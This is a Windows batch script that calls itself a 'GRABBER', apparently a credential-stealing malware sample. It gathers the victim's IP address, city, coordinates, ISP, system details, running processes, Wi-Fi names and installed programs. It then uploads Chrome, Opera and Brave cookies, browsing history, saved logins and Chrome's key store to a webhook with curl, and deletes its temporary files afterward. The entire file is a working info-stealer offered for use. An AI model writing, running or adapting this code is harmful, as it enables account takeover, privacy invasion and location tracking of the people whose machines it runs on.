@echo off
set webhook=
echo.
curl -s -o C:\ProgramData\ipv4.txt https://myexternalip.com/raw
set /p ipv4=<C:\ProgramData\ipv4.txt
curl -s -o C:\ProgramData\ipv6.txt https://ipapi.co/ip/
set /p ipv6=<C:\ProgramData\ipv6.txt
curl -s -o C:\ProgramData\city.txt https://ipapi.co/city/
set /p city=<C:\ProgramData\city.txt
curl -s -o C:\ProgramData\latitude.txt https://ipapi.co/latlong/
set /p loc1=<C:\ProgramData\latitude.txt
curl -s -o C:\ProgramData\mobile.txt http://ip-api.com/json/?fields=mobile
set /p mobile=<C:\ProgramData\mobile.txt
curl -s -o C:\ProgramData\proxy.txt http://ip-api.com/json/?fields=proxy
set /p proxy=<C:\ProgramData\proxy.txt
curl -s -o C:\ProgramData\operateur.txt https://ipapi.co/org/
set /p isp=<C:\ProgramData\operateur.txt
curl -s -o C:\ProgramData\postal.txt https://ipapi.co/postal/
set /p postal=<C:\ProgramData\postal.txt
tasklist >C:\ProgramData\tasklist.txt
systeminfo >C:\ProgramData\systeminfo.txt
netsh wlan show profile | findstr les >C:\ProgramData\wifiname.txt
powershell -Command "Get-ItemProperty HKLM:\Software\Wow6432Node\Microsoft\Windows\CurrentVersion\Uninstall\* | Select-Object DisplayName, DisplayVersion, Publisher, InstallDate | Format-Table >C:\ProgramData\programms.txt "
curl ^
  -H "Content-Type: application/json" ^
  -d "{\"username\": \"GRABBER\", \"content\": \":person_pouting:** %username% was GRABBED** \n\n **:detective: IPV4 : %ipv4% **\n :arrow_right_hook:** IPV6 if possible : %ipv6%**\n :mailbox:** Postal code : %postal% **\n :cityscape: **City : %city%** \n :mobile_phone: **mobile: %mobile% **\n :man_construction_worker: **ORG : %isp%**\n :airplane: **Loc : %loc1%**\n :earth_asia: **PROXY : %proxy%**\n\n :gear: **__PARAMETERS__:**\n\n :timer:** DATE OF SPY : %date% at %time%** \n **:bust_in_silhouette: USERNAME : %username%** \n :information_source:** COMPUTER NAME : %computername%** \n :minidisc: **%PROCESSOR_IDENTIFIER%** \n :window: **%os%**\n\n :moyai: **__https://github.com/Anonym0usse__**\n\"}" ^
    %webhook%
curl -s -F P=@"C:\ProgramData\programms.txt" %webhook%
curl -s -F T=@"C:\ProgramData\tasklist.txt" %webhook%
curl -s -F S=@"C:\ProgramData\systeminfo.txt" %webhook%
curl -s -F W=@"C:\ProgramData\wifiname.txt" %webhook%
curl -s -X POST -H "Content-type: application/json" --data "{\"content\": \"**Chrome data :  **\"}" %webhook%
curl -s -F c=@"%localappdata%\Google\Chrome\User Data\Default\Cookies" %webhook%
curl -s -F h=@"%localappdata%\Google\Chrome\User Data\Default\History" %webhook%
curl -s -F s=@"%localappdata%\Google\Chrome\User Data\Default\Shortcuts" %webhook%
curl -s -F b=@"%localappdata%\Google\Chrome\User Data\Default\Bookmarks" %webhook%
curl -s -F l=@"%localappdata%\Google\Chrome\User Data\Default\Login Data" %webhook%
curl -s -F l=@"%localappdata%\Google\Chrome\User Data\Local State" %webhook%
curl -s -X POST -H "Content-type: application/json" --data "{\"content\": \"**Opera data : **\"}" %webhook%
curl -s -F c=@"%appdata%\Opera Software\Opera Stable\Cookies" %webhook%
curl -s -F h=@"%appdata%\Opera Software\Opera Stable\History" %webhook%
curl -s -F s=@"%appdata%\Opera Software\Opera Stable\Shortcuts" %webhook%
curl -s -F b=@"%appdata%\Opera Software\Opera Stable\Bookmarks" %webhook%
curl -s -F l=@"%appdata%\Opera Software\Opera Stable\Login Data" %webhook%
curl -s -X POST -H "Content-type: application/json" --data "{\"content\": \"**Brave data : **\"}" %webhook%
curl -s -F ff=@"%localappdata%\BraveSoftware\Brave-Browser\User Data\Default\Bookmarks" %webhook%
curl -s -F hf=@"%localappdata%\BraveSoftware\Brave-Browser\User Data\Default\History" %webhook%
curl -s -F df=@"%localappdata%\BraveSoftware\Brave-Browser\User Data\Default\Login Data" %webhook%
curl -s -F daf=@"%localappdata%\BraveSoftware\Brave-Browser\User Data\Default\Shortcuts" %webhook%
del C:\ProgramData\city.txt 
del C:\ProgramData\programms.txt 
del C:\ProgramData\tasklist.txt 
del C:\ProgramData\systeminfo.txt
del C:\ProgramData\wifiname.txt 
del C:\ProgramData\operateur.txt
del C:\ProgramData\latitude.txt
del C:\ProgramData\city.txt
del C:\ProgramData\proxy.txt
del C:\ProgramData\mobile.txt
del C:\ProgramData\ipv4.txt
del C:\ProgramData\ipv6.txt
del C:\ProgramData\postal.txt
